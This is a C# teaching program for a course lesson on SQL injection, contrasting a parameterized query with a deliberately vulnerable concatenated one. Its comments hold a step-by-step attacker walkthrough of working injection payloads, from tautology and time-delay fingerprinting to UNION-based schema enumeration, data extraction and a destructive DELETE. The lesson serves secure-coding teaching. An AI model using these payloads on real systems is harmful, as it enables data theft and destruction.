#region Copyright
/* ******************************************************************** *
 *                   Copyright (C) 2026, DataBank IMX                   *
 *                                                                      *
 * All rights reserved                                                  *
 *                                                                      *
 * For further information consult:                                     *
 *  - The DataBank IMX End User License Agreement (EULA)                *
 *    or                                                                *
 *  - DataBank IMX Intellectual Property Statement                      *
 *                                                                      *
 * Above referenced documents available upon request from:              *
 *     development@databankimx.com                                      *
 *                                                                      *
 * ******************************************************************** */
#endregion

#region Using Directives
using System;
using CSharp.Ch09.Supplemental._02.SqlInjection.HelperClasses.Database;
using CSharp.SharedLibrary.HelperClasses;
using CSharp.SharedLibrary.Models;
#endregion

namespace CSharp.Ch09.Supplemental._02.SqlInjection
{
    internal static class Program
    {
        /* DEVELOPER WARNING!
         *
         * This project needs the same restored ExternalData database as
         * CSharp.Ch09.Supplemental.01.AdoNetAndEntityFramework, see that project's README.md
         * if you haven't restored it yet.
         *
         * Only ever run code like UnsafeDatabaseUtility against a throwaway sandbox database
         * you don't mind damaging, ExternalData, restored from its own backup, is exactly
         * that. NEVER run anything resembling this against a real system, in production,
         * staging, or otherwise, even "just to test." The whole point of this lesson is that
         * this pattern gives an attacker real, uncontrolled access to run arbitrary SQL, and
         * the walkthrough below includes a step that deletes data outright.
         */

        #region Chapter Notes
        /*
         * SQL injection happens when user-supplied input is spliced directly into a SQL
         *   statement's text, rather than passed as a separate parameter. When that happens,
         *   the database has no way to tell "data the user typed" apart from "more SQL the
         *   user wrote", because by the time the string reaches the database, they're both
         *   just... more SQL text.
         *
         * The fix is not "sanitize" or "escape" the input yourself, string-manipulation
         *   defenses are notoriously easy to get wrong and easy to bypass. The fix is
         *   PARAMETERIZED QUERIES: pass the SQL statement's shape (with placeholders) and the
         *   actual values as two SEPARATE things, and let the database driver handle sending
         *   them to the database safely. Compare SafeDatabaseUtility.cs and
         *   UnsafeDatabaseUtility.cs side by side, the difference is a handful of lines.
         *
         * This project's ExecuteQuery() methods intentionally mirror each other closely
         *   (same connection handling, same structure) specifically so the ONE meaningful
         *   difference, how the search value reaches the SQL statement, stands out clearly.
         */
        #endregion

        #region Main Method
        private static void Main()
        {
            try
            {
                using var safeDb = new SafeDatabaseUtility();
                using var unsafeDb = new UnsafeDatabaseUtility();

                while (true)
                {
                    Console.Clear();
                    Console.WriteLine("Enter a Murphy's Law name to search, or EXIT to quit...");
                    Console.WriteLine("(Try \"Murphy's Law\" first, then work through the walkthrough in this file's comments.)");
                    string lawName = Console.ReadLine();
                    if (string.IsNullOrEmpty(lawName)) continue;
                    if (lawName.Equals("exit", StringComparison.OrdinalIgnoreCase)) break;

                    /*
                     * Example of how this could be used in a real data breach.
                     * As the attacker, assume we don't know the schema at all, and that the
                     *   underlying query looks something like:
                     *     SELECT [column_a] FROM [table] WHERE [column_b] = '[value]'
                     * Our objectives, in order:
                     *   1. Confirm the normal, expected behavior works
                     *   2. Test whether the input is actually vulnerable
                     *   3. Identify the database architecture
                     *   4. Enumerate the tables that exist
                     *   5. Enumerate the columns in a table that looks interesting
                     *   6. Extract data from it
                     *   7. Possibly do damage
                     *
                     * Step 1: (Confirm the standard process works)
                     *   Enter:  Murphy's Law
                     *   Result: Returns the expected law text, both safe and unsafe queries agree
                     *
                     * Step 2: (Test for vulnerability)
                     *   Enter:  Murphy's Law' OR '1' = '1
                     *   Result: The safe, parameterized query finds nothing (there's no law
                     *           literally named that whole string). The unsafe query returns
                     *           EVERY row in the table, the "OR '1'='1'" turned the WHERE
                     *           clause into something that's always true.
                     *
                     * Step 3: (Identify the database architecture)
                     *   Enter one of the following against the UNSAFE query until it pauses
                     *   for 5 seconds, whichever one pauses tells you which engine you're
                     *   talking to (we already know it's SQL Server here, but a real attacker
                     *   wouldn't, this is exactly how they'd find out):
                     *     MySQL:       Murphy's Law' AND 0 = SLEEP(5);--
                     *     SQL Server:  Murphy's Law'; WAITFOR DELAY '00:00:05';--
                     *     Oracle:      Murphy's Law' AND 0 = DBMS_SESSION.sleep(5);--
                     *
                     * Interlude: 3.5 (other reconnaissance an attacker might try here)
                     *   - Identify architecture and version:
                     *       ' UNION (SELECT @@VERSION);--                (SQL Server and MySQL)
                     *       ' UNION (SELECT banner FROM v$version);--    (Oracle)
                     *   - Identify the host server:
                     *       ' UNION (SELECT @@SERVERNAME);--             (SQL Server)
                     *       ' UNION (SELECT @@HOSTNAME);--               (MySQL)
                     *   - Identify how many columns the real query returns (try increasing
                     *     <num> until it errors, the last one that worked is the count):
                     *       ' ORDER BY <num>;--                          (all engines)
                     *   - Identify the database user the app connects as:
                     *       ' UNION SELECT SYSTEM_USER;--                (SQL Server)
                     *       ' UNION SELECT SYSTEM_USER();--              (MySQL)
                     *
                     * Step 4: (List out the database's tables)
                     *   Enter (SQL Server, matching what we already know we're running):
                     *     ' UNION (SELECT TABLE_SCHEMA + '.' + TABLE_NAME FROM INFORMATION_SCHEMA.TABLES);--
                     *   Result: Lists every table in ExternalData: MurphysLaws, Numbers,
                     *           Phrases, TestItems, ZipCodes. In a real breach, this is the
                     *           step where an attacker finds the table names that actually
                     *           matter, "useraccount", "orders", "payments", whatever they are.
                     *
                     * Step 5: (List out columns from a table of interest)
                     *   Enter:
                     *     ' UNION (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MurphysLaws');--
                     *   Result: Lists LawID, LawName, LawText.
                     *
                     * Step 6: (Extract data)
                     *   Enter:
                     *     ' UNION (SELECT RTRIM(LawName) + '|' + RTRIM(LawText) FROM dbo.MurphysLaws);--
                     *   Result: Every row in MurphysLaws, dumped through what was supposed to
                     *           be a single-value lookup. MurphysLaws has nothing sensitive in
                     *           it, that's deliberate, so this lesson is safe to run, but the
                     *           TECHNIQUE is identical to how a real attacker would exfiltrate
                     *           usernames, password hashes, or payment data through the exact
                     *           same kind of vulnerable single-value search box.
                     *
                     * Step 7: (Do damage - only try this if you're ready to restore from backup!)
                     *   Enter:  '; DELETE FROM dbo.MurphysLaws;--
                     *   Result: Every row in MurphysLaws is gone. Restore ExternalData from
                     *           ExternalData.bak (see README.md in the ADO.NET Supplemental)
                     *           to get it back. This step is exactly why the warning at the
                     *           top of this file exists, run nothing resembling this against
                     *           any database you're not fully prepared to lose.
                     */

                    Console.WriteLine($"{Environment.NewLine}Attempting safe (parameterized) query...");
                    try
                    {
                        Console.WriteLine("Results:");
                        foreach (string result in safeDb.ExecuteQuery(lawName)) Console.WriteLine(result);
                    }
                    catch (Exception sx)
                    {
                        Console.WriteLine($"Error executing safe query for [{lawName}]");
                        HandleException(sx, true);
                    }

                    Console.WriteLine($"{Environment.NewLine}Attempting unsafe (concatenated) query...");
                    try
                    {
                        Console.WriteLine("Results:");
                        foreach (string result in unsafeDb.ExecuteQuery(lawName)) Console.WriteLine(result);
                    }
                    catch (Exception ux)
                    {
                        // Caught separately so a malformed injection attempt (a syntax error
                        //   partway through the playbook, easy to do by hand) doesn't take
                        //   down the whole lesson loop.
                        Console.WriteLine($"Error executing unsafe query for [{lawName}]");
                        HandleException(ux, true);
                    }

                    GenericFunctions.Pause();
                }
            }
            catch (Exception ex)
            {
                new DatabankException("Error Caught!", ex).Log();
                GenericFunctions.Pause();
            }
            finally
            {
                GenericFunctions.Pause(final: true);
            }
        }
        #endregion

        #region Helper Functions
        // Process any exceptions
        private static void HandleException(Exception ex, bool messageOnly = false)
        {
            while (ex != null)
            {
                Console.WriteLine(messageOnly ? ex.Message : ex.ToString());
                ex = ex.InnerException;
            }
        }
        #endregion
    }
}

#region Source Code Information
/* ******************************************************************** *
 *                   Copyright (C) 2026, DataBank IMX                   *
 *                                                                      *
 * Source code provided for reference only! Reuse not permitted!        *
 * ******************************************************************** */
#endregion
